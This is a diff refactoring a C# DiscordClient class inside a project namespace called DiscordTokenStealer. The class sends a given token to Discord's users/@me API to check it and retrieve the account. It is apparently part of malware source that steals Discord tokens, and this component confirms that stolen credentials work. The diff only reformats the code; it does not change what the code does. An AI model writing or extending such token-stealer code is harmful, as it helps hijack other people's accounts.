@@ -1,41 +1,36 @@
-﻿using System;
-using System.IO;
-using System.Net;
-using System.Net.Http;
+﻿using System.Net;
 using System.Text.Json;
-using System.Threading.Tasks;
 
-namespace DiscordTokenStealer.Discord
+namespace DiscordTokenStealer.Discord;
+public class DiscordClient : IDisposable
 {
-    public class DiscordClient : IDisposable
+    private readonly HttpClient _httpClient;
+    public DiscordClient()
     {
-        private readonly HttpClient _httpClient;
-        public DiscordClient()
+        _httpClient = new HttpClient(new HttpClientHandler { UseProxy = true, Proxy = new WebProxy() }, true)
         {
-            _httpClient = new HttpClient(new HttpClientHandler { UseProxy = true, Proxy = new WebProxy() }, true)
-            {
-                Timeout = TimeSpan.FromSeconds(15),
-                BaseAddress = new Uri("https://discordapp.com/api/")
-            };
-        }
+            Timeout = TimeSpan.FromSeconds(15),
+            BaseAddress = new Uri("https://discordapp.com/api/")
+        };
+    }
 
-        public async Task<DiscordUser?> Login(string token)
+    public async Task<DiscordUser?> Login(string token)
+    {
+        using HttpRequestMessage request = new(HttpMethod.Get, "users/@me");
+        request.Headers.TryAddWithoutValidation("Authorization", token);
+        using HttpResponseMessage response = await _httpClient.SendAsync(request);
+        if (response.StatusCode != HttpStatusCode.OK)
         {
-            using HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, "users/@me");
-            request.Headers.TryAddWithoutValidation("Authorization", token);
-            using HttpResponseMessage response = await _httpClient.SendAsync(request);
-            if (response.StatusCode != HttpStatusCode.OK)
-            {
-                return null;
-            }
-            await using Stream json = await response.Content.ReadAsStreamAsync();
-            return await JsonSerializer.DeserializeAsync<DiscordUser>(json);
+            return null;
         }
+        await using Stream json = await response.Content.ReadAsStreamAsync();
+        return await JsonSerializer.DeserializeAsync<DiscordUser>(json);
+    }
 
-        public void Dispose()
-        {
-            _httpClient.Dispose();
-            GC.SuppressFinalize(this);
-        }
+
+    public void Dispose()
+    {
+        _httpClient.Dispose();
+        GC.SuppressFinalize(this);
     }
 }
